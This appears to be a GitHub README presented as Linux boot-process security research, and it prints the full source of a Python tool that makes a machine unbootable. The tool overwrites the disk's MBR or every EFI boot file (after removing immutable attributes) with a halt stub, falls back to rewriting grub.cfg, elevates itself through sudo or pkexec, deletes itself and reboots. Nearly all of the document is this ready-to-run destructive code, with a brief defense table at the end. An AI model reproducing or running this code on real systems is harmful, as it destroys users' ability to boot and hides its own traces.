# 🔬 linux-boot-research 


<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║                    SECURITY RESEARCH PAPER                    ║
║              Linux Boot Process Analysis                      ║
╚══════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Security%20Research-red)]()

**Author:** Vladislav Khudash (17)  
**Date:** 02.03.2026  
**Project:** LINUX-BOOT-RESEARCH  

</div>

---

## ⚠️ CRITICAL RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **🔬 Purpose** | Security research on Linux boot process and firmware interaction |
| **🧪 Environment** | **ISOLATED VIRTUAL MACHINES ONLY** — Never run on production systems |
| **⚖️ Legal** | This research demonstrates attack vectors for defensive purposes only |
| **💀 Warning** | This code will **PREVENT SYSTEM FROM BOOTING** |
| **📚 Educational** | Understanding boot process manipulation is essential for building robust defenses |

</div>

---

# English

## 📖 Table of Contents

| Section | Description |
|---------|-------------|
| [1. Configuration](#1-configuration-section) | Message and platform detection |
| [2. Imports and Initialization](#2-imports-and-initialization) | Module imports and global variables |
| [3. Utility Functions](#3-utility-functions) | writef(), cmd() |
| [4. GRUB Configuration](#4-grub-configuration) | grub_cfg() |
| [5. MBR Bootloader](#5-mbr-bootloader) | make_mbr() — 16-bit real mode bootloader |
| [6. UEFI Application](#6-uefi-application) | make_efi() — 64-bit UEFI application |
| [7. Disk Detection](#7-disk-detection) | disk_bios(), get_esp(), bootefi() |
| [8. BIOS Mode](#8-bios-mode) | BIOS() |
| [9. UEFI Mode](#9-uefi-mode) | UEFI() |
| [10. Fallback Mode](#10-fallback-mode) | DEFAULT() |
| [11. Main Entry Point](#11-main-entry-point) | main() |
| [12. Defense Recommendations](#12-defense-recommendations) | Protection measures |

---

# English

## 1. Configuration Section

<details>
<summary><b>📁 Click to expand: Message and Platform Detection (FULL CODE)</b></summary>

```python
#===================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 02.03.2026
#     PROJECT  : LINUX-BOOT-RESEARCH
#     PLATFORM : LINUX
#===================================#

MSG = '[ LINBOOT ]\nBOOT HALTED'
```

**Analysis:**

| Variable | Default Value | Purpose |
|----------|---------------|---------|
| `MSG` | `'[ LINBOOT ]\nBOOT HALTED'` | Message displayed at boot (ASCII for BIOS, UTF-16LE for UEFI) |

**Constraints:**
- **BIOS (ASCII)**: Maximum 478 characters (limited by 512-byte MBR sector)
- **UEFI (UTF-16LE)**: Maximum 1000 characters (limited by 3584-byte EFI application)

</details>

---

## 2. Imports and Initialization

<details>
<summary><b>📁 Click to expand: Module Imports and Global Variables (FULL CODE)</b></summary>

```python
import os
from shutil import which
from re import compile as re
from subprocess import run as sp_run
from sys import exit as _exit, argv, platform, executable

__file__ = os.path.abspath(argv[0])

if platform != 'linux':
    print(f'DO NOT SUPPORT ({platform})')
    _exit(1)

IS_ROOT = os.getuid() == 0
IS_UEFI = os.path.exists('/sys/firmware/efi')

ESP_GUID = 'c12a7328-f81f-11d2-ba4b-00a0c93ec93b'
ESP_PATH = '/boot/efi'

GRUB = ('/boot/grub/grub.cfg' if os.path.isfile('/boot/grub/grub.cfg') 
    else '/boot/grub2/grub.cfg')

PROC_MOUNTS = '/proc/mounts'
SYS_DISK = '/sys/block'

SUDO = which('pkexec' if (os.environ.get('DISPLAY', False) 
    or os.environ.get('WAYLAND_DISPLAY', False)) else 'sudo')
MOUNT = which('mount') or '/usr/bin/mount'
UMOUNT = which('umount') or '/usr/bin/umount'
FINDMNT = which('findmnt') or '/usr/bin/findmnt'
LSBLK = which('lsblk') or '/usr/bin/lsblk'
CHATTR = which('chattr') or '/usr/bin/chattr'
REBOOT = which('reboot') or '/usr/sbin/reboot'

if SUDO is None:
    SUDO = '/usr/bin/' + ('pkexec' if (os.environ.get('DISPLAY', False) 
        or os.environ.get('WAYLAND_DISPLAY', False)) else 'sudo')
```

**Global Variables Analysis:**

| Variable | Value | Purpose |
|----------|-------|---------|
| `IS_ROOT` | `os.getuid() == 0` | Check if running as root |
| `IS_UEFI` | `os.path.exists('/sys/firmware/efi')` | Detect UEFI vs BIOS firmware |
| `ESP_GUID` | `c12a7328-f81f-11d2-ba4b-00a0c93ec93b` | EFI System Partition GUID |
| `ESP_PATH` | `/boot/efi` | Default ESP mount point |
| `GRUB` | `/boot/grub/grub.cfg` or `/boot/grub2/grub.cfg` | GRUB configuration file path |
| `PROC_MOUNTS` | `/proc/mounts` | Kernel mount table |
| `SYS_DISK` | `/sys/block` | Block device sysfs directory |
| `SUDO` | `pkexec` (GUI) or `sudo` (terminal) | Privilege escalation binary |

**SUDO Selection Logic:**
- If `DISPLAY` or `WAYLAND_DISPLAY` is set → use `pkexec` (GUI elevation)
- Otherwise → use `sudo` (terminal elevation)

</details>

---

## 3. Utility Functions

<details>
<summary><b>📁 Click to expand: writef(), cmd() (FULL CODE)</b></summary>

### 3.1 writef() — Write File with Sync

```python
def writef(p, data):
    with open(p, 'wb') as f:
        f.seek(0, os.SEEK_SET)
        f.write(data)
        f.flush()
        os.fsync(f.fileno())
```

**Purpose:** Write data to file and ensure it's physically written to disk (`fsync`).

### 3.2 cmd() — Execute Command and Capture Output

```python
def cmd(c):
    try:
        return sp_run(c, capture_output=True, text=True).stdout
    except:
        return ''
```

</details>

---

## 4. GRUB Configuration

<details>
<summary><b>📁 Click to expand: grub_cfg() (FULL CODE)</b></summary>

```python
def grub_cfg():
    cfg = [
        'set default=0', 
        'set timeout=0\n', 
        'menuentry "linboot" {', 
        '    clear'
    ]

    for n in MSG.splitlines():
        n = n.replace('"', '\\"')
        cfg.append(f'    echo "{n}"')

    cfg.extend(['    sleep 999999', '}'])

    return '\n'.join(cfg)
```

**Generated GRUB Configuration Example:**

```bash
set default=0
set timeout=0

menuentry "linboot" {
    clear
    echo "[ LINBOOT ]"
    echo "BOOT HALTED"
    sleep 999999
}
```

**Analysis:**
- `set timeout=0` — No boot menu delay
- `menuentry "linboot"` — Single boot entry
- `sleep 999999` — Infinite wait (prevents booting)
- Escapes double quotes in message to prevent GRUB syntax errors

</details>

---

## 5. MBR Bootloader

<details>
<summary><b>📁 Click to expand: make_mbr() — 16-bit Real Mode Bootloader (FULL CODE)</b></summary>

```python
def make_mbr():
    '''
Returns a 16-bit Master Boot Record (MBR) binary.

This MBR was assembled using NASM from the following source:


BITS 16
ORG 0x7C00


start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti
    mov si, msg


output:
    lodsb
    cmp al, 0
    je loop
    mov ah, 0x0E
    mov bh, 0x00
    int 0x10
    jmp output


loop:
    cli
    hlt


msg db 'here is (MSG)', 0
dw 0xAA55
    '''

    SIZE = 512

    template = b'\xfa1\xc0\x8e\xd8\x8e\xc0\x8e\xd0\xbc\x00|\xfb\xbe\x1f|\xac<\x00t\x08\xb4\x0e\xb7\x00\xcd\x10\xeb\xf3\xfa\xf4'
    
    template_len = len(template)
    msg_len = len(MSG)
    end_msg_len = template_len + msg_len
    
    mbr = bytearray(SIZE)
    ptr = memoryview(mbr)

    ptr[0:template_len] = template
    ptr[template_len:end_msg_len] = MSG
    ptr[end_msg_len] = 0
    ptr[510] = 0x55
    ptr[511] = 0xAA

    return ptr
```

**NASM Source Analysis:**

| Instruction | Purpose |
|-------------|---------|
| `cli` | Disable interrupts |
| `xor ax, ax` | Zero AX register |
| `mov ds/es/ss, ax` | Set segment registers to 0 |
| `mov sp, 0x7C00` | Set stack pointer (grows down from 0x7C00) |
| `sti` | Enable interrupts |
| `mov si, msg` | Load message address |
| `lodsb` | Load byte from [SI] into AL, increment SI |
| `cmp al, 0` | Check for null terminator |
| `je loop` | If null, jump to infinite loop |
| `mov ah, 0x0E` | BIOS teletype output function |
| `int 0x10` | Call BIOS video interrupt |
| `jmp output` | Loop back |
| `cli` / `hlt` | Disable interrupts and halt CPU |
| `dw 0xAA55` | Boot signature (required for BIOS to recognize as bootable) |

**Memory Layout:**

```
Offset  | Content
--------|----------------------------------------
0x00    | Template (NASM-compiled code)
0x1F    | Message string (ASCII)
...     | Null terminator
0x1FE   | 0x55 (boot signature low byte)
0x1FF   | 0xAA (boot signature high byte)
```

**Template Hex Dump:**
```
fa 31 c0 8e d8 8e c0 8e d0 bc 00 7c fb be 1f 7c  ; cli; xor ax,ax; mov ds,ax; ...
ac 3c 00 74 08 b4 0e b7 00 cd 10 eb f3 fa f4     ; lodsb; cmp al,0; je; mov ah,0x0E; int 0x10; ...
```

</details>

---

## 6. UEFI Application

<details>
<summary><b>📁 Click to expand: make_efi() — 64-bit UEFI Application (FULL CODE)</b></summary>

```python
def make_efi():
    '''
Returns a 64-bit UEFI application binary.

This UEFI was assembled using NASM from the following source:


bits 64
default rel


EFI_SUCCESS                       equ 0
EFI_LOAD_ERROR                    equ 0x8000000000000001
EFI_INVALID_PARAMETER             equ 0x8000000000000002
EFI_UNSUPPORTED                   equ 0x8000000000000003
EFI_BAD_BUFFER_SIZE               equ 0x8000000000000004
EFI_BUFFER_TOO_SMALL              equ 0x8000000000000005
EFI_NOT_READY                     equ 0x8000000000000006
EFI_NOT_FOUND                     equ 0x8000000000000014
EFI_SYSTEM_TABLE_SIGNATURE        equ 0x5453595320494249


%macro UINTN 0
    RESQ 1
    alignb 8
%endmacro

%macro UINT32 0
    RESD 1
    alignb 4
%endmacro

%macro UINT64 0
    RESQ 1
    alignb 8
%endmacro

%macro EFI_HANDLE 0
    RESQ 1
    alignb 8
%endmacro

%macro POINTER 0
    RESQ 1
    alignb 8
%endmacro


struc EFI_TABLE_HEADER
    .Signature  UINT64
    .Revision   UINT32
    .HeaderSize UINT32
    .CRC32      UINT32
    .Reserved   UINT32
endstruc

struc EFI_SYSTEM_TABLE
    .Hdr                  RESB EFI_TABLE_HEADER_size
    .FirmwareVendor       POINTER
    .FirmwareRevision     UINT32
    .ConsoleInHandle      EFI_HANDLE
    .ConIn                POINTER
    .ConsoleOutHandle     EFI_HANDLE
    .ConOut               POINTER
    .StandardErrorHandle  EFI_HANDLE
    .StdErr               POINTER
    .RuntimeServices      POINTER
    .BootServices         POINTER
    .NumberOfTableEntries UINTN
    .ConfigurationTable   POINTER
endstruc


struc EFI_OUTPUT
    .reset      POINTER      
    .print      POINTER      
endstruc


section .text
global _start
_start:
    mov rcx, [rdx + EFI_SYSTEM_TABLE.ConOut]
    mov rdx, MSG
    call [rcx + EFI_OUTPUT.print]
    jmp $


section .data
MSG db __utf16__ `here is (MSG)`
    ''' 

    SIZE = 3584
    OFFSET = 2049

    template = b'MZx\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\t\xcd!\xb8\x01L\xcd!This program cannot be run in DOS mode.$\x00\x00PE\x00\x00d\x86\x03\x00\xe72\xa4i\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00"\x00\x0b\x02\x0e\x00\x00\x02\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00@\x01\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\n\x00`\x81\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00.text\x00\x00\x00\x13\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00`.data\x00\x00\x00\xd0\x07\x00\x00\x00 \x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\xc0.reloc\x00\x00\x0c\x00\x00\x00\x000\x00\x00\x00\x02\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00H\x8bJ@H\xba\x00 \x00@\x01\x00\x00\x00\xffQ\x08\xeb\xfe\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc'

    efi = bytearray(SIZE)
    ptr = memoryview(efi)

    msg = MSG + bytes(OFFSET - len(MSG))

    template_len = len(template)
    msg_len = len(msg)
    end_msg_len = template_len + msg_len

    ptr[0:template_len] = template
    ptr[template_len:end_msg_len] = msg
    ptr[end_msg_len:] = b'\x10\x00\x00\x0c\x00\x00\x00\x06\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    return ptr
```

**NASM Source Analysis (UEFI):**

| Instruction | Purpose |
|-------------|---------|
| `bits 64` | 64-bit code |
| `default rel` | RIP-relative addressing |
| `EFI_SYSTEM_TABLE_SIGNATURE` | `0x5453595320494249` ("IBI SYST") |
| `mov rcx, [rdx + EFI_SYSTEM_TABLE.ConOut]` | Load Console Output protocol |
| `mov rdx, MSG` | Load message address |
| `call [rcx + EFI_OUTPUT.print]` | Call print function |
| `jmp $` | Infinite loop |

**PE/COFF Header Analysis:**

| Offset | Content | Purpose |
|--------|---------|---------|
| 0x00 | `MZ` | DOS stub signature |
| 0x3C | `0x78` | Offset to PE header |
| 0x78 | `PE\0\0` | PE signature |
| `.text` | Code section | Contains UEFI code |
| `.data` | Data section | Contains UTF-16LE message |
| `.reloc` | Relocation section | Base relocations |

**EFI Application Structure:**
- **DOS Stub**: Prints "This program cannot be run in DOS mode."
- **PE Header**: 64-bit EFI application
- **Code**: Loads ConOut protocol, prints message, infinite loop
- **Data**: UTF-16LE encoded message at offset 2049

</details>

---

## 7. Disk Detection

<details>
<summary><b>📁 Click to expand: disk_bios(), get_esp(), bootefi() (FULL CODE)</b></summary>

### 7.1 disk_bios() — Detect BIOS Boot Disk

```python
def disk_bios():
    if not (os.path.isfile(PROC_MOUNTS) or os.path.isdir(SYS_DISK)):
        return None
    
    root_disk = cmd([FINDMNT, '-n', '-o', 'SOURCE', '/']).strip()

    if not os.path.exists(root_disk):
        with open(PROC_MOUNTS, 'r') as f:
            f.seek(0, os.SEEK_SET)

            for line in f:
                n = line.split()

                if (len(n) < 2) or (n[1] != '/'):
                    continue

                root_disk = n[0]
                break
            else:
                return None
            
    root_disk = re(r'p?\d+$').sub('', root_disk)
        
    SIGN = b'\x55\xaa'
   
    for n in os.listdir(SYS_DISK):
        if n not in root_disk:
            continue

        dev = f'/dev/{n}'

        try:
            with open(dev, 'rb') as f:
                f.seek(0, os.SEEK_SET)
                sector = memoryview(f.read(512))

                if (len(sector) == 512) and (sector[510:512] == SIGN):
                    return dev
        except:
            break

    return None
```

**Detection Algorithm:**
1. Get root filesystem device via `findmnt` or `/proc/mounts`
2. Strip partition number (e.g., `/dev/sda1` → `/dev/sda`)
3. Check each disk in `/sys/block` matching the base device
4. Read first 512 bytes and verify boot signature `0x55 0xAA`
5. Return device path or `None`

### 7.2 get_esp() — Detect EFI System Partition

```python
def get_esp():
    for line in cmd([LSBLK, '-l', '-n', '-o', 'NAME,PARTTYPE,MOUNTPOINT']).splitlines():
        n = line.strip().split()
        n_len = len(n)

        if (n_len < 2) or (n[1] != ESP_GUID):
            continue
        
        dev = n[0]
        esp = n[2] if n_len > 2 else ESP_PATH

        if os.path.exists(esp):
            return [dev, esp]
        
        os.makedirs(esp, exist_ok=True)
        cmd([MOUNT, f'/dev/{dev}', esp])

        if os.path.exists(esp):
            return [dev, esp]
 
    return [None, ESP_PATH if os.path.exists(ESP_PATH) else None]
```

**Detection Algorithm:**
1. Use `lsblk` to list partitions with PARTTYPE (GUID)
2. Find partition with `ESP_GUID` (`c12a7328-f81f-11d2-ba4b-00a0c93ec93b`)
3. Get mount point or use default `/boot/efi`
4. Mount if not already mounted
5. Return `[device, mount_point]` or `[None, fallback_path]`

### 7.3 bootefi() — Find EFI Boot Files

```python
def bootefi(esp):
    boot = []

    for root, _, files in os.walk(esp):
        for n in files:
            if n.endswith('.efi'):
                boot.append(os.path.join(root, n))

    return boot
```

</details>

---

## 8. BIOS Mode

<details>
<summary><b>📁 Click to expand: BIOS() (FULL CODE)</b></summary>

```python
def BIOS():
    disk = disk_bios()

    if disk is None:
        DEFAULT()
        return
    
    mbr = make_mbr()

    try:
        writef(disk, mbr)  
        os.sync()  
    except:
        DEFAULT()
```

**BIOS Attack Flow:**
1. Detect boot disk via `disk_bios()`
2. Generate custom MBR with `make_mbr()`
3. Overwrite first 512 bytes of disk
4. Sync filesystems
5. Fallback to `DEFAULT()` if disk detection fails

</details>

---

## 9. UEFI Mode

<details>
<summary><b>📁 Click to expand: UEFI() (FULL CODE)</b></summary>

```python
def UEFI():
    dev, esp = get_esp()

    if esp is None:
        DEFAULT()
        return
    
    efi = make_efi()
    written = False

    if dev is None:
        dev = cmd([FINDMNT, '-n', '-o', 'SOURCE', esp]).strip()

    cmd([UMOUNT, '-l', esp]) 
    os.makedirs(esp, exist_ok=True)
    cmd([MOUNT, '-o', 'rw,exec,suid,dev', dev, esp])

    for n in bootefi(esp):
        try:
            cmd([CHATTR, '-i', n])
            cmd([CHATTR, '-a', n])
            writef(n, efi)
            written = True
        except: 
            continue

    if not written:
        DEFAULT()
        return

    os.sync()
```

**UEFI Attack Flow:**
1. Detect ESP via `get_esp()`
2. Generate custom EFI application with `make_efi()`
3. Unmount and remount ESP with write/exec permissions
4. Find all `.efi` files in ESP via `bootefi()`
5. Remove immutable (`-i`) and append-only (`-a`) attributes
6. Overwrite each EFI file with custom application
7. Sync filesystems
8. Fallback to `DEFAULT()` if no EFI files found

</details>

---

## 10. Fallback Mode

<details>
<summary><b>📁 Click to expand: DEFAULT() (FULL CODE)</b></summary>

```python
def DEFAULT():
    global MSG

    MSG = MSG.decode('UTF-16LE' if IS_UEFI else 'ASCII')

    if not os.path.isfile(GRUB):
        _exit(-1)

    with open(GRUB, 'w') as f:
        f.seek(0, os.SEEK_SET)
        f.write(grub_cfg())
        f.flush()
    os.sync()
```

**Fallback Attack Flow:**
1. Decode message from bytes back to string
2. Check if GRUB configuration exists
3. Overwrite GRUB configuration with custom boot entry
4. Sync filesystems

</details>

---

## 11. Main Entry Point

<details>
<summary><b>📁 Click to expand: main() (FULL CODE)</b></summary>

```python
def main():
    global MSG

    if not isinstance(MSG, str):
        raise TypeError('(MSG) must be str')
    
    if IS_UEFI:
        if len(MSG) > 1000:
            raise OverflowError('(MSG) length > 1000')
        
        MSG = MSG.encode('UTF-16LE')
    else:
        if not MSG.isascii():
            raise ValueError(f'(MSG) must be ASCII')
        
        MSG = MSG.encode('ASCII')

        if len(MSG) > 478:
            raise OverflowError('(MSG) length > 478')
    
    not IS_ROOT and os.execv(SUDO, [SUDO, executable, __file__])

    (UEFI if IS_UEFI else BIOS)()
    
    if os.path.isfile(__file__): 
        try:
            os.remove(__file__)
        except: ...

    sp_run([REBOOT])
    _exit(0)

if __name__ == '__main__': main()
```

**Main Execution Flow:**
1. Validate `MSG` type
2. Encode message:
   - **UEFI**: UTF-16LE (max 1000 chars)
   - **BIOS**: ASCII (max 478 chars, must be ASCII-only)
3. Elevate to root if not already (`sudo` or `pkexec`)
4. Execute `UEFI()` or `BIOS()` based on firmware detection
5. Self-delete the script file
6. Reboot system

</details>

---

## 12. Defense Recommendations

### 12.1 Boot Chain Protection

| Measure | Implementation |
|---------|----------------|
| **Secure Boot** | Enable UEFI Secure Boot with custom keys |
| **Measured Boot** | TPM 2.0 with PCR policy enforcement |
| **GRUB Password** | Set `superusers` and password in `grub.cfg` |
| **Read-only ESP** | Mount ESP as read-only after boot |
| **MBR Write Protection** | Enable BIOS write protection on firmware |

### 12.2 Filesystem Protection

| Measure | Implementation |
|---------|----------------|
| **Immutable GRUB Config** | `chattr +i /boot/grub/grub.cfg` |
| **Immutable EFI Files** | `chattr +i /boot/efi/EFI/*/*.efi` |
| **Monitor Boot Files** | File integrity monitoring (AIDE, Tripwire) |
| **Backup Boot Sector** | `dd if=/dev/sda of=mbr_backup.bin bs=512 count=1` |

### 12.3 Runtime Detection

| Measure | Implementation |
|---------|----------------|
| **Audit Logging** | Monitor writes to `/dev/sd*`, `/boot/efi/`, `/boot/grub/` |
| **EDR/XDR** | Detect direct disk writes from userspace |
| **Anomaly Detection** | Alert on `chattr -i` followed by write to boot files |

### 12.4 Recovery Preparation

| Measure | Implementation |
|---------|----------------|
| **Live USB** | Keep bootable Linux USB for recovery |
| **MBR Backup** | Regular backup of MBR sector |
| **EFI Backup** | Regular backup of EFI System Partition |
| **GRUB Rescue** | Know how to boot from GRUB rescue shell |

---

# Русский

## 1. Аннотация исследования

Данное исследование изучает **механизмы манипуляции процессом загрузки Linux** на уровне прошивки, загрузчика и файловой системы.

| Уровень | Вектор атаки |
|---------|--------------|
| **BIOS/MBR** | Перезапись первых 512 байт диска кастомным загрузчиком |
| **UEFI/EFI** | Перезапись `.efi` файлов в ESP разделе |
| **GRUB** | Модификация `grub.cfg` для бесконечного ожидания |
| **Самоликвидация** | Удаление исполняемого файла после выполнения |

---

## 2. Анализ MBR загрузчика

| Инструкция | Назначение |
|------------|------------|
| `cli` | Запрет прерываний |
| `xor ax, ax` | Обнуление AX |
| `mov ds/es/ss, ax` | Установка сегментных регистров в 0 |
| `mov sp, 0x7C00` | Установка указателя стека |
| `mov si, msg` | Загрузка адреса сообщения |
| `lodsb` | Загрузка байта из [SI] в AL |
| `int 0x10` | Вызов BIOS видео прерывания |
| `dw 0xAA55` | Сигнатура загрузки |
